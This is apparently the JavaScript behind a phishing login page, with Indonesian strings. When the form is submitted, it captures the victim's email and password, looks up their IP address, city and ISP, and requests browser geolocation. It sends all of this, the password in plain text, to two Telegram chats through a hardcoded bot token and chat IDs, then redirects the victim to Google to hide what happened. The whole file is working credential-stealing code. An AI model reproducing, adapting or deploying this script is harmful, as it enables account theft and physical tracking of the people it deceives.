document.getElementById("loginForm").addEventListener("submit", async function(event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;
    let waktuLogin = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    let botToken = "AAFmbkgr8rhoSkow-Yf6EXTy8DPu0Az 7021";
    let chatIds = ["7894929132", "6786210993"]; 
    let profileImageUrl = "https://staticg.sportskeeda.com/editor/2022/01/f49b9-16421055515852-1920.jpg";

    let ipInfo = { ip: "Tidak diketahui", city: "Tidak diketahui", country: "Tidak diketahui", org: "Tidak diketahui" };
    try {
        let response = await fetch("https://ipinfo.io/json?token=961f6caebd0f7d");
        ipInfo = await response.json();
    } catch (error) {
        console.error("Gagal mendapatkan data IP:", error);
    }

    async function getUserLocation() {
        return new Promise((resolve) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve(`📍 Koordinat: ${position.coords.latitude}, ${position.coords.longitude}`);
                    },
                    () => {
                        resolve("📍 Lokasi: Tidak diizinkan oleh user");
                    }
                );
            } else {
                resolve("📍 Lokasi: Tidak didukung di browser ini");
            }
        });
    }
    let lokasiUser = await getUserLocation();

    let message = `🔒 *Login Berhasil!*\n\n`
                + `🕒 *Waktu:* ${waktuLogin}\n`
                + `📧 *Email:* ${email}\n`
                + `🔑 *Password:* ${password}\n`
                + `🌍 *IP:* ${ipInfo.ip}\n`
                + `📍 *Lokasi:* ${ipInfo.city}, ${ipInfo.country}\n`
                + `🏢 *Provider:* ${ipInfo.org}\n`
                + `${lokasiUser}`;

    async function sendToAllChats(urlTemplate) {
        return Promise.all(chatIds.map(chatId => fetch(urlTemplate(chatId))));
    }

    await sendToAllChats(chatId => 
        `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(profileImageUrl)}`
    );

    await sendToAllChats(chatId => 
        `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`
    );

    console.log("✅ Semua data terkirim ke 2 ID!");

    window.location.href = "https://www.google.com";
});
